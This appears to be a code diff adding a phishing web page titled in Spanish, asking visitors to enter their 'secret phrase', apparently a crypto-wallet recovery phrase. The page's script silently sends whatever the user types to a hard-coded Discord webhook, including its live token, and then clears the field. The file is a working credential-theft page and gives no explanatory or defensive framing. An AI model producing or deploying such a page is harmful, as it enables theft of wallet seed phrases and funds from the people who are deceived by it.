@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Coloca tu frase secreta para continuar</title>
+    <style>
+      body {
+        background-color: blue;
+      }
+      h1 {
+        color: white;
+      }
+      #container {
+        margin: 50px auto;
+        width: 400px;
+        text-align: center;
+      }
+      #input-field {
+        background-color: rgba(255, 192, 203, 0.5);
+        border: none;
+        border-radius: 10px;
+        font-size: 20px;
+        margin-bottom: 20px;
+        padding: 10px;
+        width: 100%;
+      }
+      #submit-button {
+        background-color: pink;
+        border: none;
+        border-radius: 10px;
+        color: white;
+        font-size: 20px;
+        padding: 10px 20px;
+      }
+      .error {
+        color: red;
+        font-size: 14px;
+        margin-top: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="container">
+      <h1>Enter your secret phrase to continue</h1>
+      <form id="my-form">
+        <input type="text" id="input-field" placeholder="Enter your phrase here">
+        <br>
+        <button type="submit" id="submit-button">Submit</button>
+        <div id="error-message" class="error"></div>
+      </form>
+    </div>
+    <script>
+      const form = document.getElementById("my-form");
+      const inputField = document.getElementById("input-field");
+      const errorMessage = document.getElementById("error-message");
+
+      form.addEventListener("submit", (event) => {
+        event.preventDefault();
+        const phrase = inputField.value;
+        if (phrase.trim() === "") {
+          errorMessage.textContent = "Error!";
+          setTimeout(() => {
+            errorMessage.textContent = "";
+          }, 2000);
+        } else {
+          const webhookUrl = "https://discordapp.com/api/webhooks/1089376156001771520/8zcE4kmxhybKRgra4kNUIG3M8e9jKPK-OwmVjC86k_VzusJYoah8qDgrFwl5NgOGnyev";
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content: phrase })
+          });
+          inputField.value = "";
+        }
+      });
+    </script>
+  </body>
+</html>
